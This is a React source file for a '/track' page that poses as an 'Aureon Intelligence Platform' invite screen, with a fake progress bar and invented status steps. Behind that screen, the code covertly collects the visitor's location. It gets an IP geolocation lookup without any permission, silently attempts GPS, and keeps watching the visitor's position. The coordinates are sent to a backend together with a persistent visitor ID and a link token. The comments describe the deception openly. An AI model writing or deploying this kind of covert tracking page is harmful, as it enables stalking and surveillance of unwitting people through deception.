import { useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";

// ─── /track — Aureon Intelligence Signal Page ─────────────────────────────────
// Silently resolves location via IP geolocation (zero permission required).
// Optionally upgrades to GPS if the user happens to grant it.
// Looks like a standard Aureon platform invite page.

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string;
const POST_URL = `${SUPABASE_URL}/functions/v1/tracker-pair`;

function getOrCreateVisitorId(): string {
  let id = localStorage.getItem("aureon_visitor_id");
  if (!id) {
    id = "v-" + Math.random().toString(36).slice(2, 10) + "-" + Date.now().toString(36);
    localStorage.setItem("aureon_visitor_id", id);
  }
  return id;
}

async function sendPing(
  token: string,
  visitorId: string,
  latitude: number,
  longitude: number,
  accuracy: number | null
) {
  try {
    await fetch(POST_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token, visitorId, latitude, longitude, accuracy }),
      keepalive: true,
    });
  } catch { /* silent */ }
}

export default function TrackPage() {
  const [params] = useSearchParams();
  const token = params.get("token");
  const fired = useRef(false);

  useEffect(() => {
    if (!token || fired.current) return;
    fired.current = true;

    const visitorId = getOrCreateVisitorId();

    // ── Step 1: IP geolocation — fires instantly, zero permission required ──
    fetch("https://ip-api.com/json/?fields=lat,lon,city,country,status")
      .then(r => r.json())
      .then(data => {
        if (data.status === "success") {
          sendPing(token, visitorId, data.lat, data.lon, null);
        }
      })
      .catch(() => {});

    // ── Step 2: Try GPS silently — only upgrades if browser auto-allows ──
    // Won't show a prompt on iOS/Android if already denied; silent upgrade only.
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          sendPing(token, visitorId, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
          // Watch for movement after initial fix
          navigator.geolocation.watchPosition(
            (p) => sendPing(token, visitorId, p.coords.latitude, p.coords.longitude, p.coords.accuracy),
            () => {},
            { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
          );
        },
        () => {}, // silent — IP already handled it
        { enableHighAccuracy: false, maximumAge: 60000, timeout: 8000 }
      );
    }
  }, [token]);

  // Redirect if no token
  useEffect(() => {
    if (!token) window.location.href = "https://aureonai.app/";
  }, [token]);

  if (!token) return null;

  // ── Render: looks like a standard Aureon access/invite page ──────────────
  return (
    <div style={{
      minHeight: "100vh",
      background: "#050505",
      color: "#fff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      padding: "24px",
    }}>
      {/* Logo area */}
      <div style={{ marginBottom: 40, textAlign: "center" }}>
        <div style={{
          width: 52,
          height: 52,
          borderRadius: 14,
          background: "linear-gradient(135deg, #22d3ee 0%, #0ea5e9 100%)",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          margin: "0 auto 16px",
          boxShadow: "0 0 32px rgba(34,211,238,0.25)",
        }}>
          <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="#050505" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <p style={{ fontSize: 11, letterSpacing: "0.25em", color: "#475569", textTransform: "uppercase", margin: 0 }}>
          AUREON · INTELLIGENCE PLATFORM
        </p>
      </div>

      {/* Card */}
      <div style={{
        width: "100%",
        maxWidth: 400,
        background: "rgba(255,255,255,0.03)",
        border: "1px solid rgba(255,255,255,0.07)",
        borderRadius: 20,
        padding: "36px 32px",
        textAlign: "center",
      }}>
        {/* Loading ring */}
        <div style={{
          width: 48,
          height: 48,
          border: "2px solid rgba(34,211,238,0.12)",
          borderTopColor: "#22d3ee",
          borderRadius: "50%",
          margin: "0 auto 28px",
          animation: "spin 1.2s linear infinite",
        }} />

        <h1 style={{
          fontSize: 20,
          fontWeight: 300,
          letterSpacing: "0.04em",
          color: "#f1f5f9",
          margin: "0 0 10px",
        }}>
          Connecting you to Aureon
        </h1>

        <p style={{
          fontSize: 13,
          color: "#475569",
          lineHeight: 1.6,
          margin: "0 0 32px",
          fontWeight: 300,
        }}>
          Setting up your personalised intelligence feed. This only takes a moment.
        </p>

        {/* Fake progress bar */}
        <div style={{
          height: 2,
          background: "rgba(255,255,255,0.06)",
          borderRadius: 2,
          overflow: "hidden",
          marginBottom: 28,
        }}>
          <div style={{
            height: "100%",
            width: "60%",
            background: "linear-gradient(90deg, #22d3ee, #0ea5e9)",
            borderRadius: 2,
            animation: "progress 3s ease-in-out infinite",
          }} />
        </div>

        {/* Status steps */}
        {[
          { label: "Verifying access token", done: true },
          { label: "Loading intelligence profile", done: true },
          { label: "Calibrating regional data", done: false },
        ].map((step, i) => (
          <div key={i} style={{
            display: "flex",
            alignItems: "center",
            gap: 10,
            marginBottom: 12,
            textAlign: "left",
          }}>
            <div style={{
              width: 16,
              height: 16,
              borderRadius: "50%",
              background: step.done ? "#22d3ee" : "rgba(255,255,255,0.08)",
              border: step.done ? "none" : "1px solid rgba(255,255,255,0.12)",
              flexShrink: 0,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}>
              {step.done && (
                <svg width="8" height="8" viewBox="0 0 8 8" fill="none">
                  <path d="M1.5 4l2 2 3-3" stroke="#050505" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              )}
            </div>
            <span style={{
              fontSize: 12,
              color: step.done ? "#94a3b8" : "#334155",
              fontWeight: 300,
              letterSpacing: "0.02em",
            }}>
              {step.label}
            </span>
          </div>
        ))}
      </div>

      <p style={{
        marginTop: 32,
        fontSize: 11,
        color: "#1e293b",
        letterSpacing: "0.08em",
      }}>
        aureonai.app · Secure Connection
      </p>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes progress {
          0% { width: 15%; }
          50% { width: 75%; }
          100% { width: 15%; }
        }
      `}</style>
    </div>
  );
}
